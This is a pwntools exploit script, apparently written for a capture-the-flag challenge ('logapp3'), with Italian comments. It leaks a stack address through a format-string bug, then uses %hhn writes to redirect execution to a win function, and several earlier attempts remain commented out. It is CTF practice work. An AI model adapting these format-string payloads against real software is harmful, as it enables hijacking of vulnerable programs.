#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './logapp3')

host = args.HOST or 'logapp3.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4015bc
continue
'''.format(**locals())

# -- Exploit goes here --
# 0x401dde win
# io = start()

# i = 5

# print(int("0x40",16)) # 64 
# print(int("0x1d",16)) # 29
# print(int("0xde",16)) # 222
# print(hex(222))

# arg = 47
# try:
#     io = start()
#     # # print(io.recvline())# payload = f"%29x%10$hhn".encode() + f"%{64 - 29}x%9$hhn".encode() + f"%{222 - 64 - 29}x%11$hhn".encode() 
#     payload = f"A%28c%48$hhn".encode() + f"A%64c%47$hhn".encode() + f"A%222c%49$hhn".encode()
    
#     payload = payload.ljust(0x40, b"A") + p64(0x40152f + 0x1) + p64(0x40152f+0x2) +p64(0x40152f)
#     io.sendlineafter(b"> ", b"1")
#     io.sendlineafter(b": ", payload)
#     io.sendlineafter(b": ", b"ciao")  
#     io.sendline(b"2")
#     # print(io.recvline())
#     io.sendlineafter(b": ", b"SuperStrongPassword")
#     io.recvline()
#     resp = io.recvline()
#     cio = io.recvline()
#     # resp1 = io.recvline()
#     print(resp)
#     First = False
#     io.close()
# except EOFError:
#     io.close()
#     pass

# print(int("0x40",16)) # 64 
# print(int("0x1d",16)) # 29
# print(int("0xe6",16)) 

# 
i = 0
io = start()
# while True:
payload = f"%8$p"
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", payload.encode()) # username
io.sendlineafter(b": ", p64(0xdeadbeef)) # password
# print(io.recvline())
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b": ", b"SuperStrongPassword")
resp0 = io.recvline()
resp = io.recvline().decode() # puntatore

addr = int(resp, 16) - (0x820 - 0x4e8)
log.info(f"Indirizzo di noi interessa: {addr = :x}") 
payload = f"A%28c%52$hhn".encode() + f"A%{222 - 30}c%51$hhn".encode() + b"AAAAAAA" + p64(addr) + p64(addr+1)

# input("")
print(io.recvline())
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", payload) # username
io.sendlineafter(b": ", p64(0xdeadbeef)) # password

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b": ", b"SuperStrongPassword")
print(i, resp)

# input("")
# io.recvline()
resp1 = io.recvline()

io.interactive()

io.close()


# i = 48
# First = True
#     # i += 1

# io = start()
# payload = f"A%28c%49$hn".encode() + f"AAAAA".encode() + p64(0x7ffd952b57a8)
# io.sendlineafter(b"> ", b"1")
# io.sendlineafter(b": ", payload) # username
# io.sendlineafter(b": ", p64(0xdeadbeef)) # password
# # print(io.recvline())
# io.sendlineafter(b"> ", b"2")
# io.sendlineafter(b": ", b"SuperStrongPassword")
# resp0 = io.recvline()
# resp = io.recvline()
# # io.recvline()
# resp1 = io.recvline()
# print(resp)
# input("")
# # if b"nil" not in resp:
# #     print(i, resp)
# #     input("Continue: ")
# First = False
# io.close()




# # io.interactive()

